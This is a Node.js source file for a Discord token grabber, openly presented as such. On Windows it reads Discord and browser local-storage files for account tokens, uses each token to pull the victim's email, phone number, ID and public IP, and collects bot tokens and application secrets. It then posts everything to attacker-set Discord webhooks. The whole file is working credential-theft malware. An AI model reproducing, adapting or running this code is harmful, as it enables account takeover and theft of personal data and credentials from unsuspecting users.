const webhook_for_accs =
  "YOUR WEBHOOK URL"; // for accs
const webhook_for_bots =     // 2 channels better
 "YOUR WEBHOOK URL" // for bots
const mention_for_accs = true; // if you don't want a mention change it to false
const mention_for_bots = false;// if you want a mention change it to true
const fetch = require("node-fetch"); // npm i node-fetch
const { sep } = require("path");
const { readFileSync, readdirSync, existsSync } = require("fs");
const roaming = process.env.APPDATA;
const local = process.env.LOCALAPPDATA;
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
if (process.platform === "win32") {
  function main() {
    function findt(path = String()) {
      const reg = /[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}|mfa\.[\d\w_-]{84}/g;
      path = path + "\\Local Storage\\leveldb";
      try {
        for (const file of readdirSync(path)) {
          if (file.endsWith(".log") || file.endsWith(".ldb")) {
            const txt = readFileSync(`${path}\\${file}`).toString();
            var match;
            match = txt.match(reg);
            if (match) {
              const dui = [...new Set(match)];
              for (let i = 0; i < dui.length; i++) {
                fetch_token("https://discord.com/api/v6/users/@me", dui[i]);
                bot_tokens(dui[i]);
              }
            }
          }
        }
      } catch (e) {
        if (e) console.log(e);
      }
      return;
    }
    function names() {
      const paths = {
        Discord: roaming + "\\Discord",
        discordcanary: roaming + "\\discordcanary",
        discordptb: roaming + "\\discordptb",
        Chrome: local + "\\Google\\Chrome\\User Data\\Default",
        "Opera Software": roaming + "\\Opera Software\\Opera Stable",
        "Brave-Browser": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        YandexBrowser: local + "\\Yandex\\YandexBrowser\\User Data\\Default",
      };
      for (const path of Object.values(paths)) {
        if (existsSync(path)) {
          findt(path);
        }
      }
    }
    names();
    async function get_ip() {
      const res = await fetch("https://api.ipify.org/").then((_) => _.text());
      return res;
    }
    function fetch_token(
      url = "https://discord.com/api/v6/users/@me",
      token = String()
    ) {
      var content = mention_for_accs ? "@everyone" : "";
      content += "Hello we are get somethings good *:)*";
      fetch(url, {
        headers: {
          authorization: token,
        },
      })
        .then((_) => _.json())
        .then((res) => {
          if (res.message !== "401: Unauthorized") {
            console.log(res);
            (async () => {
              var avatar = res.avatar ? `https://cdn.discordapp.com/avatars/${res.id}/${res.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.floor(Math.random() * 6)}.png`
              const ip = await get_ip();
              send(
                webhook_for_accs,
                content,
                "https://cdn.discordapp.com/attachments/832261813059059754/855188587283873832/0a7f6c7533b02fd1dc3397e6f70c5f14.png",
                `${res.username}#`,
                avatar,
                11730954,
                "Good Grab!",
                "https://www.github.com",
                "**Take some values**",
                avatar,
                "token",
                `\`\`\`${token}\`\`\``,
                "informations",
                `\`\`\`email: ${res.email}\nnumber: ${
                  res.phone
                }\nverified? ${res.verified}\nid: ${res.id}\nip: ${ip}\`\`\``,
                "https://image.freepik.com/free-vector/hacked-word-with-glitch-effect_225004-655.jpg",
                "It was developed by AbdullahSH..🎄🤍#2552",
                "https://cdn.discordapp.com/avatars/567399605877080071/9a96bd631eb14b7f059268d3c25ee9ac.png"
              );
            })();
          }
        });
    }
    async function bot_tokens(token) {
      try {
        const res = await fetch(
          "https://discord.com/api/v9/applications?with_team_applications=true",
          {
            method: "GET",
            headers: {
              Authorization: token,
            },
          }
        );
        const json = await res.json();
        var content = mention_for_bots ? "@everyone" : "";
        content += "Hello we are get somethings good *:)*";
        for (let i = 0; i < json.length; i++) {
          await sleep(1000);
          try {
            var avatar = json[i].bot.avatar ? `https://cdn.discordapp.com/avatars/${json[i].bot.id}/${json[i].bot.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.floor(Math.random() * 6)}.png`
            send(
              webhook_for_bots,
              content,
              "https://cdn.discordapp.com/attachments/832261813059059754/855188587283873832/0a7f6c7533b02fd1dc3397e6f70c5f14.png",
              json[i].bot.username,
              avatar,
              4312527,
              "Good Grab Bot!",
              "https://www.github.com",
              "**Take some values**",
              avatar,
              "token",
              `\`\`\`${json[i].bot.token}\`\`\``,
              "informations",
              `\`\`\`secret: ${json[i].secret}\npublic? ${json[i].bot_public}\nverify_key: ${json[i].verify_key}\nid: ${json[i].bot.id}\nowner_id: ${json[i].owner.id}\nowner_name: ${json[i].owner.username}\`\`\``,
              "https://image.freepik.com/free-psd/hacked-text-effect_247287-19.jpg",
              "It was developed by ! AbdullahSH#2004",
              "https://cdn.discordapp.com/avatars/567399605877080071/9a96bd631eb14b7f059268d3c25ee9ac.png"
            );
          } catch (e) {
            console.log(e);
          }
        }
      } catch (e) {
        console.log(e);
      }
    }
    function send(
      url = String(),
      content = String(),
      avatar_bot = String(),
      username = String(),
      author_url = String(),
      color = 11730954,
      title = String(),
      title_url = String(),
      description = String(),
      avatar = String(),
      field1 = String(),
      value1 = String(),
      field2 = String(),
      value2 = String(),
      image_url = String(),
      footer_text = String(),
      footer_img = String()
    ) {
      return fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "node.js token grabber",
          avatar_url: avatar_bot,
          content: content,
          allowed_mentions: {
            parse: ["everyone"],
          },
          embeds: [
            {
              color: color,
              author: {
                name: username,
                url: author_url,
                icon_url: avatar,
              },
              title: title,
              url: title_url,
              thumbnail: {
                url: avatar,
              },

              description: description,
              fields: [
                {
                  name: field1,
                  value: value1,
                },
                {
                  name: field2,
                  value: value2,
                },
              ],
              image: {
                url: image_url,
              },
              footer: {
                text: footer_text,
                icon_url: footer_img,
              },
            },
          ],
        }),
      }).then((response) => {
        if (response.status !== 204) {
            setTimeout(() => send.bind(this ,url, content), 1000)
        }
      })
    }
  }

  main();
} else if (process.platform === "drawin") {
  //soon ...
} else if (process.platform === "linux") {
  //soon ...
} else {
}
